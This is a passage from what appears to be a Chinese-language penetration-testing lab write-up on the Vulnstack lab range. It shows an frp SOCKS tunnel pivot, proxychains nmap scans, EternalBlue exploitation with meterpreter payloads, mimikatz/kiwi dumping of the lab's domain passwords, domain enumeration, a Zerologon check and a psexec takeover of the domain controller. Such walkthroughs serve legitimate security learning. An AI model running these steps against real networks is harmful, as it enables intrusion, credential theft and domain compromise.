./frps -c ./frps.ini
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145841-0e7933c6-1001-1.png"/><br/>
客户端（client）：ubuntu-web1(192.168.71.20)<br/>
会将客户端中所有的流量通过本地的一个随机端口转发给vps的7000端口，我们访问vps的7777端口就相当于访问客户端的7000端口</p>
<div class="highlight"><pre><span></span>frpc.ini

[common]
server_addr = 192.168.71.10
server_port = 7000

[plugin_socks]
type = tcp
remote_port = 7777
plugin = socks5

上传frp
proxychains scp / Desktop/3.tgz cs@192.168.71.20:'/tmp'
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145901-1a04e3b6-1001-1.png"/></p>
<div class="highlight"><pre><span></span>tar -zxvf 3.tgz #解压
启动
chmod +777 frpc
nohup ./frpc -c ./frpc.ini &gt;/dev/null 2&gt;<span class="err">&amp;</span>1 <span class="err">&amp;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145925-2860e220-1001-1.png"/><br/>
kali本地添加proxy配置</p>
<div class="highlight"><pre><span></span>vim /etc/proxychains4.conf 
socks5 192.168.1.128 7777
socks5 192.168.52.10 7777
socks5 192.168.71.10 7777
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621145944-33c3e054-1001-1.png"/></p>
<h2 data-content="1" id="b4fe196bfe996974e94dd020a53ddb06"><strong>7 实验七：内网主机存活扫描</strong></h2>
<p>通过proxychains扫描第四层网络：<br/>
探测92.168.93.1/24网段存活主机</p>
<div class="highlight"><pre><span></span>proxychains nmap -Pn -sT -sV -F -O 192.168.93.1/24
</pre></div>
<p>使用metasploit的 auxiliary/scanner/smb/smb_version 模块（可用来探测Windows主机存活）来扫描第三层网络中的主机存活：</p>
<pre><code>proxychains msfconsole
use auxiliary/scanner/smb/smb_version
set rhosts 192.168.93.1-255
set threads 5
run</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150022-4a3dfca2-1001-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150027-4db467a4-1001-1.png"/></p>
<p>发现第四层网络中还有两个Windows主机，分别为DC（192.168.93.30）和PC2（192.168.93.40），使用nmap进一步扫描主机信息<br/>
扫描192.168.93.30</p>
<div class="highlight"><pre><span></span>proxychains nmap -Pn -sT -sV -F -O 192.168.93.30
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150049-5a827ffc-1001-1.png"/></p>
<div class="highlight"><pre><span></span>proxychains nmap --script smb-vuln-ms17-010 192.168.93.30
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150105-642b8968-1001-1.png"/></p>
<p>扫描192.168.93.40</p>
<div class="highlight"><pre><span></span>proxychains nmap -Pn -sT -sV -F -O 192.168.93.40
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150119-6c997e98-1001-1.png"/><br/>
发现两台机器且存在域</p>
<h2 data-content="1" id="5a82361af8b8889346c41aa4597d5e84"><strong>8 实验八：ms17-010</strong></h2>
<p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。<br/>
已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。<br/>
使用Metasploit对目标进行监听</p>
<div class="highlight"><pre><span></span>proxychains msfconsole  # 启动Metasploit
search ms17-010     # 查找永恒之蓝漏洞
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150231-970eab26-1001-1.png"/></p>
<div class="highlight"><pre><span></span>use exploit/windows/smb/ms17_010_eternalblue  #执行漏洞
set payload windows/x64/meterpreter/reverse_tcp  #执行payload
show options  #查看当前攻击配置
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150247-a1231692-1001-1.png"/><br/>
将配置中第一行的RHOST修改为192.168.93.30</p>
<div class="highlight"><pre><span></span>set rhost 192.168.93.30
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150302-a9889122-1001-1.png"/><br/>
配置完成后，使用run命令执行程序，如果执行成功，会进入windows系统的命令行</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150328-b98d04e0-1001-1.png"/></p>
<p>会话创建失败，域控这个先放一放，看看WIn7机器能不能进行上线</p>
<div class="highlight"><pre><span></span><span class="nx">use</span> <span class="nx">exploit</span><span class="o">/</span><span class="nx">windows</span><span class="o">/</span><span class="nx">smb</span><span class="o">/</span><span class="nx">ms17_010_eternalblue</span>
<span class="nx">set</span> <span class="nx">rhosts</span> <span class="mf">192.168.93.40</span>
<span class="nx">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">bind_tcp</span>
<span class="nx">set</span> <span class="nx">rhost</span> <span class="mf">192.168.93.40</span>
<span class="nx">set</span> <span class="nx">lport</span> <span class="mi">4444</span>
<span class="nx">exploit</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150407-d0cb765a-1001-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150417-d6aa12de-1001-1.png"/></p>
<p>拿下一个</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150456-edb391f8-1001-1.png"/></p>
<div class="highlight"><pre><span></span>screenshot  # 截屏
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150517-fa2067f4-1001-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150523-fe060de2-1001-1.png"/><br/>
上传/下载文件</p>
<div class="highlight"><pre><span></span>upload ~/Desktop/test.txt C://frp
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150536-057aa984-1002-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150542-0952c0aa-1002-1.png"/></p>
<h2 data-content="1" id="26ea0203d5e00e0e7715c4bd4a2ccd31"><strong>实验九：内网信息收集</strong></h2>
<p>拿下第四层网络中的Windows 7服务器后，接下来我们对目标内网环境进行信息收集，对目标网络有一个初步的了解：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150642-2d02c5c2-1002-1.png"/></p>
<p>抓取域用户密码<br/>
使用meterpreter上的kiwi模块尝试抓取域用户及域管理员的密码：</p>
<div class="highlight"><pre><span></span>load kiwi
kiwi_cmd privilege::debug
kiwi_cmd sekurlsa::logonPasswords
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150654-34617e12-1002-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150659-3759027a-1002-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150705-3a8e1f5c-1002-1.png"/><br/>
成功抓取到域用户moretz和域管理员administrator的凭证：</p>
<div class="highlight"><pre><span></span>moretz：Moretz2021
administrator：Whoami2021
</pre></div>
<p>远程桌面</p>
<div class="highlight"><pre><span></span>proxychains rdesktop 192.168.93.40
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150724-46306536-1002-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621150732-4a88b854-1002-1.png"/></p>
<div class="highlight"><pre><span></span>ipconfig /all   # 查看本机ip，所在域
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151110-cccae3aa-1002-1.png"/></p>
<div class="highlight"><pre><span></span>systeminfo      # 列出系统信息
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151152-e5db78dc-1002-1.png"/></p>
<div class="highlight"><pre><span></span>route print     # 打印路由信息
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151218-f53ff4d8-1002-1.png"/></p>
<div class="highlight"><pre><span></span>net view        # 查看局域网内其他主机名
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151241-02ade454-1003-1.png"/></p>
<div class="highlight"><pre><span></span>netstat -ano        # 查看端口连接情况
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151257-0cb12876-1003-1.png"/></p>
<div class="highlight"><pre><span></span>tasklist            # 查看当前进程
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151318-18e2e634-1003-1.png"/></p>
<div class="highlight"><pre><span></span>arp -a          # 查看arp缓存
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151355-2f2cca22-1003-1.png"/></p>
<div class="highlight"><pre><span></span>whoami
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151418-3ced6ac2-1003-1.png"/></p>
<div class="highlight"><pre><span></span>net start       # 查看开启了哪些服务
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151447-4e42496e-1003-1.png"/></p>
<div class="highlight"><pre><span></span>net share       # 查看开启了哪些共享
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151459-552feaba-1003-1.png"/></p>
<div class="highlight"><pre><span></span>net config workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151539-6d06ec92-1003-1.png"/></p>
<div class="highlight"><pre><span></span>net user                 # 查看本机用户列表
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151557-77c7a41e-1003-1.png"/></p>
<div class="highlight"><pre><span></span>net user /domain         # 查看域用户
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151614-8219b786-1003-1.png"/></p>
<div class="highlight"><pre><span></span>net localgroup administrators   # 查看本地管理员组（通常会有域用户）
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151630-8b850c76-1003-1.png"/></p>
<div class="highlight"><pre><span></span>net view /domain         # 查看有几个域
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151648-95f22f40-1003-1.png"/></p>
<div class="highlight"><pre><span></span>net user 用户名 /domain   # 获取指定域用户的信息
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151718-a7e54944-1003-1.png"/></p>
<div class="highlight"><pre><span></span>net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151733-b0ba87fa-1003-1.png"/></p>
<div class="highlight"><pre><span></span>net group 组名 /domain    # 查看域中某工作组
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151753-bcda4598-1003-1.png"/></p>
<div class="highlight"><pre><span></span>net group "domain admins" /domain  # 查看域管理员的名字
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151819-cc55a6ac-1003-1.png"/></p>
<div class="highlight"><pre><span></span>net group "domain computers" /domain  # 查看域中的其他主机名
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151840-d908e7e2-1003-1.png"/></p>
<div class="highlight"><pre><span></span>net group "domain controllers" /domain  # 查看域控制器（可能有多台）
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621151903-e6685792-1003-1.png"/></p>
<h2 data-content="1" id="3db123654d1736dd34eda45c748f2881"><strong>10 实验十：获取域控（CVE-2020-1472）</strong></h2>
<p>当攻击者使用 Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接的Netlogon 安全通道时，存在权限提升漏洞。成功利用此漏洞，攻击者可以在网络中的设备上运行经特殊设计的应用程序。要利用此漏洞，未通过身份验证的攻击者需要将 MS-NRPC连接到域控制器，以获取域管理员访问权限，从而造成提权。 (漏洞编号：HWPSIRT-2020-18310)。<br/>
影响版本：</p>
<ul>
<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li>
<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) </li>
<li>Windows Server 2012 </li>
<li>Windows Server 2012 (Server Core installation) </li>
<li>Windows Server 2012 R2 </li>
<li>Windows Server 2012 R2 (Server Core installation) </li>
<li>Windows Server 2016 </li>
<li>Windows Server 2016 (Server Core installation) </li>
<li>Windows Server 2019</li>
<li>Windows Server 2019 (Server Core installation) </li>
<li>Windows Server, version 1909 (Server Core installation)<br/>
漏洞验证：<div class="highlight"><pre><span></span>proxychains python3 zerologon_tester.py DC 192.168.93.30
</pre></div>
</li>
</ul>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621152121-38917972-1004-1.png"/><br/>
显示success表示漏洞存在<br/>
脚本地址：<a href="https://github.com/SecuraBV/CVE-2020-1472" target="_blank">https://github.com/SecuraBV/CVE-2020-1472</a><br/>
尝试远程桌面登录</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621152135-40e936fa-1004-1.png"/><br/>
利用psexec登陆。</p>
<pre><code>use exploit/windows/smb/psexec
set rhosts 192.168.93.30
set SMBUser administrator
set SMBPass Whoami2021
set payload windows/meterpreter/bind_tcp
set rhost 192.168.93.30
run</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621152146-47e0f308-1004-1.png"/></p>
<p>拿下域控</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621152202-516b1386-1004-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230621152212-57690964-1004-1.png"/></p>
<h2 data-content="1" id="797ef2574686109fb0c0f8e1cbd75563"><strong>总结</strong></h2>
<p>从外网打点到内网横向，最后拿下域控，学到了很多，同时感谢大佬们的博客，如有不妥之处，还请各位大佬斧正。</p>
<h2 data-content="1" id="8c1fe6d286c2593ca68b6841c8059d04"><strong>参考文章：</strong></h2>
<div class="highlight"><pre><span></span><span class="nx">http</span><span class="o">:</span><span class="c1">//vulnstack.qiyuanxuetang.net/vuln/detail/9/</span>
<span class="nx">https</span><span class="o">:</span><span class="c1">//forum.butian.net/share/236</span>
<span class="nx">https</span><span class="o">:</span><span class="c1">//www.cnblogs.com/wkzb/p/14877913.html</span>
<span class="nx">https</span><span class="o">:</span><span class="c1">//xz.aliyun.com/t/12498</span>
<span class="nx">https</span><span class="o">:</span><span class="c1">//www.freebuf.com/articles/network/264560.html</span>
</pre></div>
</div>
</div>